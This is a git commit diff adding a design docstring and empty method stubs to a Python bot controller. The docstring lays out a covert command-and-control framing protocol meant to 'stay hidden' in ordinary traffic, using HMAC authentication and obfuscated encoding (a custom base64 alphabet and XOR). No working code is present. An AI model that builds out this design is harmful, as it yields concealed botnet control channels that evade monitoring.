63996252a11d0634a9b0a18639c58b42332da264
Jakub Tehlar <tehlarjakub@gmail.com>
2025-12-25 20:45:57 +0100

    add docstrings; init class methods

--- bot/controller.py
+++ bot/controller.py
@@ -1,5 +1,54 @@
 import argparse
 
+# This is the only instance of the controller that the bot will listen to
+# The bot can receive other commands from other services but it will ignore them
+# if they do not show the correct authentication logic
+
+''' 
+The validation / authenticion logic has the following function:
+   It is for the bot to decide with high confidence that the command is meant for it. 
+   Bot must recognize commands only from the controller.
+   The commands must be statistically indistinguishable from normal traffic in the topic (REQUIREMENT! STAY HIDDEN).
+   Make sure that any accidental triggers are minimized. 
+
+   Conceptual frame:
+   | MAGIC | VERSION | TYPE | LENGTH | AUTH | PAYLOAD | CHECKSUM |
+    - MAGIC: a predefined short sequence of bytes that indicates the start of a command
+    - VERSION: a byte indicating the version of the protocol
+    - TYPE: a byte indicating the type of command (e.g., announce, list-users, ...)
+    - LENGTH: a short integer indicating the length of the PAYLOAD
+    - AUTH: an authentication field (e.g., HMAC, signature)
+    - PAYLOAD: the actual command data
+    - CHECKSUM: a checksum for integrity verification 
+
+    The bot will verify these leveles one by one and if one fails, it will discard the message.
+
+
+    Authentication logic:
+    - Command-bound MAC: AUTH = hash(secret_key =| payload) -> Payload can't be tampered with
+    - The bot and controller share a secret key known only to them.
+
+    Encoding:
+    - Non-standard base64 alphabet
+    - XOR stream with rotating key
+
+'''
+class BotController:
+    def __init__(self):
+        pass
+
+    def _build_frame(self):
+        pass
+    
+    def _encode_frame(self):
+        pass
+
+    def _publish_frame(self):
+        pass
+
+    def _decode_frame(self):
+        pass
+
 def main():
     parser = argparse.ArgumentParser(description="Bot Controller")
     #1. announcing the presence of the bot to the controller if asked.
